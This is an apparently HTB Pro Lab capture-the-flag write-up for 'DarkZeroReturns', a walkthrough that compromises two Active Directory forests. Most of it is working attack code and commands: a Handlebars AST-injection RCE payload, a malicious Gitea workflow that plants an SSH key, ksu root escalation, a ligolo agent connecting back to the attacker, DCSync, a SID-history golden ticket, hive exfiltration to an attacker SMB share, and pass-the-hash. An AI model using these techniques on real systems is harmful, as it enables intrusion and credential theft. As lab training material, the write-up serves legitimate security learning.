---
title: DarkZeroReturns
layout: post
released: 2026-07-15
creators: DarkZero
pwned: true
tags:
  - boxes
  - os/linux
  - diff/hard
  - type/prolab
category:
  - HTB
description: "CVE-2026-33937 Handlebars AST RCE → Gitea CI/CD abuse → keytab ksu root → ligolo pivot → forest trust SID History golden ticket → DC01 full compromise."
image: /assets/img/img_darkzeroreturns/darkzeroreturns.png
cssclasses:
  - custom_htb
---

![DarkZeroReturns](/assets/img/img_darkzeroreturns/darkzeroreturns.png)

DarkZeroReturns is a multi-machine Pro Lab spanning two Active Directory forests — `darkzero.ext` and `darkzero.htb` — connected by a one-way forest trust. The entry point is a Linux host running a Node.js campaign management app vulnerable to a Handlebars AST injection. From there the path winds through Gitea CI/CD abuse, a Kerberos keytab delegation chain with a non-obvious `ksu` quirk, a ligolo tunnel into the internal network, and finally a cross-forest SID History golden ticket to fully compromise DC01. Every step has at least one gotcha that will brick you if you don't read the service carefully. This is one of my favorite labs in a long time.

---

# Enumeration

## Scans

As usual we start off with an `nmap` port scan:

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/full 10.129.59.58
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian
80/tcp   open  http    Node.js Express
```

Only two exposed ports. The HTTP service returns a redirect to `dzcampaigns.htb` so we add that to `/etc/hosts` and check what we're working with.

## 80 — DarkZero Campaigns

Visiting the web server we're greeted with a tabletop RPG campaign tracker — a Node.js app with user registration, login, character sheets, and campaign message boards. The source references a `/character` POST endpoint and a `/campaign/:id` page.

Feroxbuster finds a handful of routes:

```bash
feroxbuster -u http://dzcampaigns.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x js,json
```

Interesting findings: `/register`, `/login`, `/dashboard`, `/campaign/1`, `/character/new`, and `/dice` (a frontend-only dice roller that was a red herring). Nothing sensitive in the JS files, but looking at the `/character` POST handler in `app.js` through the browser devtools response, the app hands `campaign_message` directly to Handlebars for template rendering.

That's a familiar smell.

---

# Foothold

## CVE-2026-33937 — Handlebars AST Injection

The Handlebars version shipped with this app is patched against the classic prototype pollution path (`__proto__`, `constructor.prototype`) but leaves AST-level injection open. Instead of passing a template string, you can send a pre-built AST object directly — Handlebars trusts it and compiles it without the prototype check. The dangerous part is the `NumberLiteral` node type: its `value` field is interpolated as raw JavaScript in the generated code, so you can close the existing expression and inject arbitrary JS.

The payload AST looks like this:

{% raw %}
```python
def _ast(js):
    num = {
        "type": "NumberLiteral",
        "value": f"{{}},{{}})) + {js} //",
        "original": 1,
        "loc": None
    }
    this = {"type": "PathExpression", "data": False, "depth": 0,
            "parts": [], "original": "this", "loc": None}
    lookup = {"type": "PathExpression", "data": False, "depth": 0,
              "parts": ["lookup"], "original": "lookup", "loc": None}
    stmt = {"type": "MustacheStatement", "path": lookup,
            "params": [this, num], "escaped": True,
            "strip": {"open": False, "close": False}, "loc": None}
    return {"type": "Program", "body": [stmt], "strip": {}, "loc": None}
```
{% endraw %}

The `js` parameter wraps whatever Node one-liner you want:

```python
def exec(self, cmd):
    js = (
        f"process.mainModule.require('child_process')"
        f".execSync('({cmd}) 2>&1; true').toString()"
    )
    self._fire(js)
    return self._last_message()
```

We register an account, log in, POST a new character with `campaign_message` set to the AST object, then read the rendered campaign page to pick up the output embedded in the last message `<div>`.

Confirming RCE:

```bash
id
# uid=1001(darkzero) gid=1001(darkzero)
```

## Reading `.env` + MySQL Credentials

The app lives at `/opt/DarkZero_Campaigns`. Its `.env` file gives us the database password:

```bash
cat /opt/DarkZero_Campaigns/.env
```

```
DB_HOST=127.0.0.1
DB_USER=darkzero
DB_PASSWORD=[REDACTED]
DB_NAME=darkzero_campaigns
```

## Dumping the Users Table

With the MySQL credential in hand:

```bash
mysql -u darkzero -p[REDACTED] darkzero_campaigns \
  -e 'select username,password_hash from users;'
```

```
username  password_hash
admin     [HASH_REDACTED]
josh      [HASH_REDACTED]
```

Josh's hash is bcrypt. Run it through hashcat:

```bash
hashcat -m 3200 josh.hash /usr/share/wordlists/rockyou.txt
```

```
[HASH_REDACTED]:[CRACKED]
```

## SSH as Josh

```bash
ssh josh@10.129.59.58
# josh@SRV01:~$
```

---

# User Flag — Gitea CI/CD Abuse (CVE-2026-58443)

Checking the `/etc/hosts` on SRV01 we find an internal Gitea instance at `gitea.darkzero.ext:3000`. Josh has a Kerberos ticket we can obtain (no keytab — he authenticates via GSSAPI with his AD password):

```bash
echo '[REDACTED]' | kinit josh@DARKZERO.EXT
klist
# Credentials cache: API:...
# Principal: josh@DARKZERO.EXT
```

With a ticket we can hit the Gitea API using SPNEGO (`curl --negotiate -u :`).

## The Vulnerability

CVE-2026-58443 is a race condition in Gitea's "Update Branch" API call for pull requests. When you trigger an update-branch on a PR where the fork's HEAD is ahead of its base, Gitea incorrectly writes the new commits to the **head** branch of the **upstream** (parent) repository instead of updating the PR base. In practice this means: fork a repo, push a `.gitea/workflows/` file to your fork's `main`, open a PR against the upstream, and the workflow lands in the upstream's branch where Gitea Actions will run it with `svc-runner`'s user context.

The Gitea Actions runner on this box runs as `svc-runner`, who has `user.txt` in their home directory.

## Exploitation

Steps:

1. Fork `DarkZero/DarkZero-Campaigns` as josh.
2. Enable Actions on the fork.
3. Create `.gitea/workflows/foothold.yml` in the fork's `main` — the workflow appends our public key to `/home/svc-runner/.ssh/authorized_keys` and cats `user.txt`.
4. Open a PR from `darkzero-ext_josh/DarkZero-Campaigns:main` against `DarkZero/DarkZero-Campaigns:main`.
5. Post a review comment on the PR — this triggers the `pull_request_review_comment` event.
6. Gitea's race fires, the workflow runs under `svc-runner`, our key lands.

The critical part of the workflow:

```yaml
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: shell
        run: |
          mkdir -p /home/svc-runner/.ssh
          echo "ssh-ed25519 AAAA..." >> /home/svc-runner/.ssh/authorized_keys
          chmod 700 /home/svc-runner/.ssh
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
```

After about 20 seconds the runner picks it up. SSH in:

```bash
ssh -i /tmp/gitea_pwn svc-runner@127.0.0.1 'cat ~/user.txt'
# 02bc2e582a42837aaf329268d6a97ec5
```

---

# Root on SRV01 — Keytab, LDAP Delegation, and ksu

## Keytab Discovery

`svc-runner`'s home directory contains nothing sensitive, but the runner configuration at `/etc/gitea-runner/` is readable:

```bash
ls -la /etc/gitea-runner/
# -rw-r--r-- 1 root svc-runner ... svc-runner.keytab
```

The keytab belongs to `svc-runner@DARKZERO.EXT`. We can `kinit` with it:

```bash
export KRB5CCNAME=KEYRING:persistent:$(id -u):$(id -u)
kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
klist
# svc-runner@DARKZERO.EXT
```

## LDAP via GSSAPI — The SASL_NOCANON Trap

With a ticket, we want to query the domain over LDAP to find what `svc-runner` can do. Straightforward `ldapsearch -Y GSSAPI` fails:

```
SASL(-1): generic failure: GSSAPI Error: Unspecified GSS failure
```

This happens because the DC (`dc02.darkzero.ext`) has no reverse DNS record. When `cyrus-sasl` tries to canonicalize the hostname via PTR lookup it fails, constructs a bogus SPN, and the KDC rejects it. The fix is a local `ldap.conf` with `SASL_NOCANON on` — the environment variable `LDAP_OPT_X_SASL_NOCANON` alone does nothing here, it must be in a config file:

```bash
echo "SASL_NOCANON on" > /tmp/myldap.conf
export LDAPCONF=/tmp/myldap.conf

ldapsearch -Y GSSAPI -H ldap://dc02.darkzero.ext \
  -b "DC=darkzero,DC=ext" "(sAMAccountName=svc-runner)" memberOf
```

`svc-runner` is a member of a custom group that has `CreateChild` rights over the `GiteaMigration` OU. That means we can create AD users under that OU.

## Creating an AD Account Named "root"

This is the clever part. SRV01 runs MIT Kerberos and has `ksu` installed — the Kerberos `su` equivalent. `ksu root` will authenticate the calling user against Kerberos and, if the principal maps to the local `root` account, grant a root shell.

The local `root` account maps to the principal `root@DARKZERO.EXT` via `aname_to_localname`. If that principal exists in the domain and we know its password, we can `kinit root@DARKZERO.EXT` and then `ksu root` to get a root shell.

So we create it:

```bash
samba-tool user create root '[REDACTED]' \
  --use-kerberos=required \
  -H ldap://dc02.darkzero.ext \
  --userou="OU=GiteaMigration"
```

```
User 'root' created successfully
```

## The ksu `-e` Gotcha

The intuitive approach is `ksu root -e /bin/bash` — but that fails with `not authorized`. This isn't an access error in the usual sense. Inside `ksu`'s source, `get_best_princ_for_target()` explicitly returns `NOT_AUTHORIZED` whenever `-e` (a command) is passed and no `.k5login` or `.k5users` file exists for the target user. The interactive code path is different: it falls through to `aname_to_localname`, which maps `root@DARKZERO.EXT` to the local `root` account and authorizes the session.

So we pipe commands through stdin instead:

```bash
echo '[REDACTED]' | kinit root@DARKZERO.EXT
echo "id; mkdir -p /root/.ssh; cat /tmp/gitea_pwn.pub >> /root/.ssh/authorized_keys; \
  chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys" | ksu root
```

```
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
uid=0(root) gid=0(root) groups=0(root)
```

SSH key persisted. We now have direct `root@SRV01` access.

---

# Pivoting — Ligolo-ng

SRV01 can reach the internal subnet `172.16.20.0/24` where both domain controllers live. We set up a ligolo-ng tunnel.

On the attacker box:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.20.0/24 dev ligolo
sudo setcap cap_net_admin+ep $(which ligolo-proxy)

tmux new-session -d -s ligolo "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"
```

Push the agent to SRV01 and start it:

```bash
scp ligolo-ng_agent_linux_amd64 root@10.129.59.58:/tmp/ligolo-agent
ssh root@10.129.59.58 \
  'chmod +x /tmp/ligolo-agent; nohup /tmp/ligolo-agent \
   -connect 10.10.17.14:11601 -ignore-cert >/tmp/ligolo-agent.log 2>&1 &'
```

In the ligolo console:

```
>> session
>> start
```

Route is live. Both DCs are now reachable directly:

- `172.16.20.1` → DC01 (`darkzero.htb`)
- `172.16.20.2` → DC02 (`darkzero.ext`)

---

# darkzero.ext — DCSync as Celia

## Credential Recovery

On SRV01 under `/root/` there's a MySQL backup file: `darkzero_campaigns_backup.sql`. It contains a `backup_users` table with an entry for `celia`:

```sql
INSERT INTO backup_users VALUES ('celia','celia.morgan@darkzero.ext','[HASH_REDACTED]');
```

Same bcrypt, same wordlist:

```bash
hashcat -m 3200 celia.hash /usr/share/wordlists/rockyou.txt
# ...[CRACKED]
```

`celia` is an AD account in `darkzero.ext`. Verify access:

```bash
impacket-smbclient DARKZERO.EXT/celia:[REDACTED]@172.16.20.2
# Shares accessible — confirmed valid credentials
```

## DCSync

Celia turns out to be a member of `Domain Admins` on `darkzero.ext` (likely intended as the domain's admin account but poorly isolated). DCSync gives us everything:

```bash
impacket-secretsdump DARKZERO.EXT/celia:[REDACTED]@172.16.20.2 -just-dc-user krbtgt
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
krbtgt:502:[LM_HASH]:...:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:[AES256_REDACTED]
```

```bash
impacket-secretsdump DARKZERO.EXT/celia:[REDACTED]@172.16.20.2 -just-dc-user celia
```

```
celia:1109:...
celia:aes256-cts-hmac-sha1-96:[AES256_REDACTED]
```

```bash
impacket-lookupsid DARKZERO.EXT/celia:[REDACTED]@172.16.20.2
# Domain SID is: S-1-5-21-2850783758-1231244658-2051857529
```

Collected: krbtgt AES256, celia's AES256, celia's RID (1109), ext domain SID.

---

# Forest Trust — Golden Ticket with SID History

## Trust Topology

`darkzero.ext` and `darkzero.htb` have a one-way forest trust. `darkzero.ext` users can authenticate to `darkzero.htb` resources if they hold the right group memberships in the target domain — which is where SID History comes in.

First we need to identify a privileged group in `darkzero.htb` whose SID we can inject into our golden ticket's extra SIDs field.

**Important gotcha:** DC01 (`dc01.darkzero.htb`) has two A records — its real IP (`172.16.20.1`) and SRV01's own external IP. This means any hostname lookup of `dc01.darkzero.htb` from SRV01's resolver will sometimes resolve to the wrong address and hang forever. We pin the real IP manually:

```bash
echo "172.16.20.1 dc01.darkzero.htb" >> /etc/hosts
```

And add the `DARKZERO.HTB` realm to `/etc/krb5.conf` on SRV01:

```ini
[realms]
    DARKZERO.HTB = {
        kdc = 172.16.20.1
        admin_server = 172.16.20.1
    }

[domain_realm]
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
```

## Enumerating the Target Group

LDAP query across the trust — running from SRV01 with celia's ticket (the SASL_NOCANON fix is already in place):

```bash
echo '[REDACTED]' | kinit celia@DARKZERO.EXT
export LDAPCONF=/tmp/myldap.conf

# Confirm the trust object's SID (the "foreign" domain SID as seen by darkzero.ext)
ldapsearch -Y GSSAPI -H ldap://dc02.darkzero.ext \
  -b "CN=System,DC=darkzero,DC=ext" \
  "(objectClass=trustedDomain)" securityIdentifier

# Find InfrastructureAdministrators in the target domain
ldapsearch -Y GSSAPI -H ldap://dc01.darkzero.htb \
  -b "DC=darkzero,DC=htb" \
  "(cn=InfrastructureAdministrators)" objectSid
```

`InfrastructureAdministrators` in `darkzero.htb` is nested inside `Backup Operators`, giving it SeBackupPrivilege — exactly what we need to pull SAM/SYSTEM/SECURITY off DC01.

## Forging the Golden Ticket

With celia's AES256 key, RID, ext domain SID, and InfrastructureAdministrators SID extracted:

```bash
impacket-ticketer \
  -domain darkzero.ext \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -aesKey [AES256_REDACTED] \
  -user-id 1109 \
  -extra-sid S-1-5-21-XXXX-XXXX-XXXX-YYYY \
  celia
```

`-user-id 1109` is celia's actual RID, not a made-up one. Windows Server 2025 PAC hardening validates that the user RID in the ticket exists in the domain — a fictitious RID gets a `KRB_AP_ERR_MODIFIED` and you spend an hour wondering why your golden ticket is being rejected.

The `-extra-sid` field is InfrastructureAdministrators' full SID — when the `darkzero.htb` DC processes the cross-realm referral it adds these extra SIDs to the user's token, granting the group memberships in the target domain.

---

# Crossing the Trust to darkzero.htb

## Cross-Realm kvno — Run It on SRV01, Not Through the Tunnel

The natural instinct is to use the enriched ccache from the attacker box through the ligolo tunnel:

```bash
export KRB5CCNAME=celia.ccache
kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
```

This works sometimes but is unreliable. The referral from `DARKZERO.EXT` to `DARKZERO.HTB` goes through the KDCs, and the routing over the tunnel introduces enough latency to make krb5 library retries behave badly. The reliable path is to copy the ccache to SRV01 and run `kvno` there — SRV01's krb5 stack talks directly to both KDCs without tunneling:

```bash
# Push the ccache to SRV01
cat celia.ccache | base64 | ssh root@10.129.59.58 'base64 -d > /tmp/celia.ccache'

# Obtain the cross-realm service ticket on SRV01
ssh root@10.129.59.58 \
  'export KRB5CCNAME=FILE:/tmp/celia.ccache; kvno cifs/dc01.darkzero.htb@DARKZERO.HTB'
```

```
cifs/dc01.darkzero.htb@DARKZERO.HTB: kvno = 3
```

Pull the enriched ccache back — it now contains the `cifs/dc01.darkzero.htb` service ticket with our SID History injected.

## reg.py Backup via Ligolo Relay

The plan: use `impacket-reg` with the enriched ccache to invoke `reg backup` on DC01, writing the hive files to a UNC share we control. SeBackupPrivilege (via InfrastructureAdministrators → Backup Operators) lets us read SAM, SYSTEM, and SECURITY regardless of ACLs.

The SMB share can't live on the attacker box directly because `172.16.20.3` routes back to the ligolo tunnel — ligolo's `listener_add` forwards port 445 on `172.16.20.3` to our local `impacket-smbserver`:

```bash
# In ligolo console:
listener_add --addr 172.16.20.3:445 --to 127.0.0.1:4455 --tcp

# Start smbserver on port 4455
impacket-smbserver -smb2support -ip 127.0.0.1 -port 4455 backup ./smbout/
```

Kerberos tickets are time-sensitive — sync to domain time first:

```bash
DC_TIME=$(ldapsearch -x -H ldap://172.16.20.2 -s base -b "" currentTime \
  | grep currentTime | awk '{print $2}' | sed 's/\(.\{4\}\)\(.\{2\}\)\(.\{2\}\)\(.\{2\}\)\(.\{2\}\)\(.\{2\}\).*/\1-\2-\3 \4:\5:\6/')

TZ=UTC KRB5CCNAME=celia_enriched.ccache \
  faketime "$DC_TIME" impacket-reg \
  darkzero.ext/celia@dc01.darkzero.htb \
  -k -no-pass \
  -dc-ip 172.16.20.2 \
  -target-ip 172.16.20.1 \
  backup -o '\\172.16.20.3\backup'
```

Three hive files land in `./smbout/`: `SAM.save`, `SYSTEM.save`, `SECURITY.save`. The `SECURITY` hive is the largest and occasionally needs a retry if the relay times out mid-transfer.

---

# Root Flag — DC01 Administrator

## Offline secretsdump

```bash
impacket-secretsdump \
  -sam smbout/SAM.save \
  -system smbout/SYSTEM.save \
  -security smbout/SECURITY.save \
  LOCAL
```

```
[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes
Administrator:500:[LM_HASH]:...:::
DC01$:1000:[LM_HASH]:<DC01_MACHINE_NT>:::
```

We want `DC01$` — the machine account. Machine accounts are Domain Admins in their own domain and can DCSync.

## Final DCSync

```bash
impacket-secretsdump \
  "darkzero.htb/DC01\$@172.16.20.1" \
  -hashes "[LM_HASH]:<DC01_MACHINE_NT>" \
  -just-dc-user Administrator
```

```
Administrator:500:[LM_HASH]:<ADMIN_NT>:::
```

## root.txt

```bash
impacket-wmiexec \
  -hashes "[LM_HASH]:<ADMIN_NT>" \
  administrator@172.16.20.1 \
  "type C:\Users\Administrator\Desktop\root.txt"
```

Done.

---

# Key Takeaways

**CVE-2026-33937 (Handlebars AST injection):** the patch for prototype pollution doesn't validate AST input — always check whether your template engine accepts pre-built AST objects and if so whether the intermediate IR is sanitized.

**CVE-2026-58443 (Gitea PR race):** CI/CD runners executing workflows on PRs from forks are a classic foothold vector. The race here is subtle — the update-branch codepath writes to the wrong ref under concurrent modification.

**ksu `-e` vs interactive:** `ksu` with a command argument hits a code path that rejects authorization unless `.k5login`/`.k5users` is present. Interactive mode falls through to `aname_to_localname`. This isn't documented prominently — you'll hit the wall and assume the ticket is wrong when it isn't.

**SASL_NOCANON must be in a file:** the environment variable approach for disabling hostname canonicalization in OpenLDAP's GSSAPI SASL layer is silently ignored. It must be in `/etc/ldap/ldap.conf` or a file pointed to by `LDAPCONF`.

**PAC hardening (Server 2025):** golden tickets with fictitious user RIDs get rejected. Use the actual RID of the principal you're impersonating.

**Cross-realm referrals over a tunnel:** reliable on the pivot host with direct KDC access; flaky from an attacker box over ligolo due to timing. If `kvno` fails consistently from your box, push the ccache to the pivot and run it there.

**Dual A record trap:** always pin IPs for internal hostnames in `/etc/hosts` on the pivot host before attempting any Kerberos or LDAP operations against them. A second incorrect A record will send half your queries to the wrong host and give you maddening intermittent failures.
